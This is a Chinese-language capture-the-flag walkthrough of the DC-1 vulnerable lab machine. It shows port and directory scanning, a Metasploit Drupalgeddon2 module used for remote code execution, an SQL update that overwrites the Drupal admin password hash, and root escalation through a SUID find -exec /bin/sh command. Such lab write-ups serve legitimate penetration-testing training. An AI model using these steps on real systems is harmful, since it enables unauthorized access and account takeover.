## 靶机简介

DC系列的靶机是一个专门构建的易受攻击的实验室，总共有九个！目的是获得渗透测试领域的经验。它的设计初学者是一个挑战，但是它的难易程度取决于您的技能和知识以及学习能力。要成功完成此挑战，您需要具备Linux技能，熟悉Linux命令行以及具有基本渗透测试工具的经验，例如可以在Kali
Linux或Parrot Security
OS上找到的工具。有多种获得根的方法，但是，我包括了一些标志，这些标志包含了初学者的线索。总共有五个Flag，但是最终目标是在root的主目录中找到并读取该标志。您甚至不需要成为root用户即可执行此操作，但是，您将需要root特权。根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获得root资格。

## 学习到的知识

`Drupal 7` CMS的`RCE`(Metasploit)

`Drupal 7` 的 `Mysql` 写入 `SQL` 添加后台管理员账号

`find` 命令 `SUID` 权限提升

## 信息搜集

拿到靶机后先对它端口进行扫描：

    
    
    nmap -A -p- -T4 192.168.1.142
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1063.png)

扫描出来结果发现它开放了 `22`（ssh）、`80`（http）、`111`（nfs共享）。

其中 `http` 的 `web` 使用的 `CMS` 是 `Drupal 7`。我们先从 `web` 下手吧：

    
    
    http://192.168.1.142
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1064.png)

在 `web` 页面上没有啥东西，尝试了一下弱口令无果，还是先对它进行扫描目录文件吧：

    
    
    dirb http://192.168.1.142
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1065.png)

扫描出来后发现有 `robots.txt` 文件，打开后是这样的：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1066.png)

我在翻了一些文件没有得到可利用的信息，只是知道它的版本好像是 `7.x` 版本。随后我搜索了一下有关于这个 CMS 的漏洞，看看能不能捡个漏：

    
    
    searchsploit Drupal
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1067.png)

从上图可知，它漏洞还是蛮多的，刚好有一个 `RCE` 可以用 `Metasploit` 来进行利用！随后我打开 MSF
搜索了一下它的利用模块，我使用的是这个模块（前面几个看了不能用）：

    
    
    exploit/unix/webapp/drupal_drupalgeddon2
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1068.png)

之后设置 `rhosts` 开始攻击 `exploit` 得到一枚 `shell`：

看了看只是一个普通的网站权限，系统是 `Linux` 的 `Debian` 。

我先是用 `MSF` 的提权辅助模块来尝试看看能不能运气爆棚的鸡蛋里挑骨头找到一个提权模块：

    
    
    run post/multi/recon/local_exploit_suggester
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1069.png)

额，没有找到可以用来提权的模块，那么就算了～我还是先进它 `shell` 里面看看吧，只有打入敌人内部才能取敌将首级！进入到 `shell` 后先用
`python` 来得到一枚 `sh` 吧：

    
    
    python -c 'import pty;pty.spawn("/bin/sh")
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1070.png)

## Flag1

我所在的目录是网站的绝对路径 `/var/www`，下面有一个 `flag1.txt` 文件，`cat` 查看文件后拿到第一个
`flag`，里面有作者给我们的提示：

    
    
    Every good CMS needs a config file - and so do you.
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1071.png)

翻译过来大概就是让我们找 `CMS` 的配置文件，这也是我们获取下一个`flag`的线索之一！

## Flag2

得到线索后，我疯狂翻网站的目录找到了它的配置文件：

    
    
    /var/www/sites/default/settings.php
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1072.png)

查看文件后我们得到了`Flag2`，又得到了一个新线索：

    
    
    <?php
    
    /**
     *
     * flag2
     * Brute force and dictionary attacks aren't the
     * only ways to gain access (and you WILL need access).
     * What can you do with these credentials?
     *
     */
    
    $databases = array (
      'default' => 
      array (
        'default' => 
        array (
          'database' => 'drupaldb',
          'username' => 'dbuser',
          'password' => 'R0ck3t',
          'host' => 'localhost',
          'port' => '',
          'driver' => 'mysql',
          'prefix' => '',
        ),
      ),
    );
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1073.png)

翻译过来大概的意思是告诉我们暴力用字典破解不是一个有效的方式，既然得到了配置文件，你能用这个配置文件来做什么？

## Flag3

很明显了，这段提示下面就是一个数据库的配置信息，作者可能是要让我们进入到 `Mysql` 里面！

    
    
    数据库名：'drupaldb',
    用户名：'dbuser',
    密码：'R0ck3t',
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1074.png)

成功登陆到它的 Mysql 里面，我找到了一些账号和密码：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1075.png)

但是这玩意密码有哈希加密了的，我又连续查询了好多表才发现了 `Flag3` 的一丝线索：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1076.png)

它这里的 `title` 里有 `flag3`，但是里面没有提示信息！既然是在 `title` 上有 `flag3`
的线索，那么有可能是在网站的里面，也就是网站的后台里！

接着我重新写入了一段 `SQL` 语句，把管理员的密码给重置了：

    
    
    具体可以看这篇文章：https://www.isfirst.net/drupal/drupal-reset-password
    
    update users set pass='$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v' where name='admin';
    # 这段 sql 语句的意思是把 admin 的密码重置为 drupal ，因为它的 pass 加密是 password-hash.sh ，所以我们直接给他替换掉！
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1077.png)

写入成功后，我们来到网站的登陆页面：`http://192.168.1.142/user`

    
    
    admin：drupal
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1078.png)

登陆进去后我们得到了 `Flag3！` 这个时候我们又得到了一个新线索：

    
    
    Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
    

大概的意思是让我们通过 `-exec` 命令来得到密码啥的！

## Flag4

既然提示说要我们通过命令来得到密码，那么我首先是查看了 `passwd` 文件，发现了有关 `flag4` 的线索：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1079.png)

有一个 `flag4` 的用户，随后我来到了 `flag4` 的目录发现了 `flag4.txt`
文件！（saul文件是我之前玩靶机留下的，大家当作没有就好了）

打开之后呢得到了最后一个线索：

    
    
    Can you use this same method to find or access the flag in root?
    Probably. But perhaps it's not that easy.  Or maybe it is?
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1080.png)

翻译过来的意思大概是让我们以相同的方式来得到 `root` 目录下的 `flag` 。

## Flag5

得到线索后我习惯性的 `sudo -l` 查看有没有什么命令可以让我提权的，但是它没有 `sudo` 这个命令：

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1081.png)

额，有点打脑壳！借用`朝阳冬泳怪鸽`的话：我们遇到什么困难也不要怕，微笑着面对它！消除恐惧的最好办法就是面对恐惧！坚持，才是胜利。加油！奥利给！

别慌，抽根烟再好好想想！我又接着查看下，看它有没有 `root` 权限的文件，但是没有：

    
    
    find / -perm -4000 2>/dev/null
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1082.png)

接着我又查看了有没有 `root` 权限的 `SUID` 命令发现了这些：

    
    
    find / -type f -perm -u=s 2>/dev/null
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1083.png)

其中有一个命令我之前提权的时候用过，就是 `find` 命令！刚好之前在拿到 `Flag3` 的时候它提示了 `-exec` 命令！这是一个参数，搭配
`find` 查找命令使用可以调用命令来去执行！

我首先是想在 `flag4` 目录创建个文件，但是失败了！但是没关系！

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1084.png)

由于当前目录下有一个 `flag4.txt` 文件我们就直接使用 `find` 查看当前权限，请忽略上面那条命令！（当时的思路是创建一个文件，然后使用
find 命令来查找这个文件然后执行命令的）

    
    
    find flag4.txt -exec "whoami" \;
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1085.png)

可以看到，我们的权限是 `root` 了，我们直接提权把：

    
    
    find flag4.txt -exec "/bin/sh" \;
    # 这段命令的意思就是先使用 find 命令查找 flag4.txt 文件，然后使用它的参数 -exec 来执行命令 /bin/sh ，这样我们就能获取到 root 权限了！
    

![图片](https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1086.png)

最后也是在 `root` 目录下拿到了最后的 `Flag` 文件！

## 微信公众号

公众号：Gcow安全团队

![saulGoodman](https://image.3001.net/images/20200304/1583252513_5e5e8421ec6e3.jpg!small)

